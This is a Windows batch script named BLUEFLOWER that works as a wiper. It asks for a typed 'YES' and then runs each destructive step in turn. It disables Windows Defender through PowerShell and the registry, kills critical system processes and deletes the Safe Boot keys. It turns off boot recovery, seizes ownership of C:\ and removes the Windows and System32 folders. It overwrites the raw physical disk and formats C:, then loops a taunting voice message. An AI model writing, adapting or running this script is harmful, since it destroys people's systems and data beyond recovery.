@echo off
title BLUEFLOWER
color 4f
mode con: cols=110 lines=40
cls

echo.
echo                     ██████╗ ██╗   ██╗███████╗███████╗
echo                     ██╔══██╗██║   ██║██╔════╝██╔════╝
echo                     ██████╔╝██║   ██║█████╗  █████╗  
echo                     ██╔══██╗██║   ██║██╔══╝  ██╔══╝  
echo                     ██████╔╝╚██████╔╝███████╗███████╗
echo                     ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
echo.
echo                  THIS WILL INSTANTLY AND PERMANENTLY DESTROY WINDOWS
echo                         There is no recovery. Ever.
echo.
set /p "choice=               Type YES in all caps to unleash OMEGA → "

if /i not "%choice%"=="YES" (cls & echo Aborted. BLUEFLOWER is disappointed. & timeout 5 >nul & exit)

cls
echo UNLEASHING OMEGA... GOODBYE

powershell -ep bypass -c "Set-ExecutionPolicy Unrestricted -Force" >nul 2>&1

powershell -c "try{Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue}catch{}" >nul 2>&1
powershell -c "try{Set-MpPreference -DisableBehaviorMonitoring $true -EA SilentlyContinue}catch{}" >nul 2>&1
powershell -c "try{Set-MpPreference -DisableBlockAtFirstSeen $true -EA SilentlyContinue}catch{}" >nul 2>&1
powershell -c "try{Set-MpPreference -DisableIOAVProtection $true -EA SilentlyContinue}catch{}" >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\Sense" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /v Start /t REG_DWORD /d 4 /f >nul 2>&1
sc stop WinDefend >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1

taskkill /f /im taskmgr.exe /im explorer.exe /im winlogon.exe /im smss.exe >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal" /ve /t REG_SZ /d "" /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network" /ve /t REG_SZ /d "" /f >nul 2>&1
bcdedit /set {default} recoveryenabled No >nul 2>&1
bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1

takeown /f C:\Windows /r /d y >nul 2>&1
icacls C:\Windows /grant Administrators:F /t /c /q >nul 2>&1
takeown /f C:\ /r /d y >nul 2>&1
icacls C:\ /grant Administrators:F /t /c /q >nul 2>&1

:: Method 1: Classic System32 wipe
rd /s /q C:\Windows\System32 >nul 2>&1
rd /s /q C:\Windows\SysWOW64 >nul 2>&1
rd /s /q C:\Windows >nul 2>&1

powershell -c "$bytes = [byte[]] (0..255 | ForEach { $_ }) * 1000000; $stream = [IO.File]::Open('\\.\PhysicalDrive0', 'Open', 'Write'); $stream.Write($bytes,0,$bytes.Length); $stream.Close()" >nul 2>&1

echo y|format C: /fs:NTFS /q /v:BLUEFLOWER >nul 2>&1

powershell -c "while(1){[Console]::Beep(32767,100); $v=New-Object -ComObject Sapi.SpVoice; $v.Rate=20; $v.Speak('OMEGA COMPLETE. YOUR PC IS DEAD FOREVER')}" >nul 2>&1

cls
echo.
echo                     OMEGA PROTOCOL EXECUTED
echo                     WINDOWS = OBLITERATED
echo                     DRIVE   = FORMATTED
echo                     BOOT    = CORRUPTED
echo.
echo                YOUR DEVICE IS NOW A $400 PAPERWEIGHT
ping -n 999 127.0.0.1 >nul
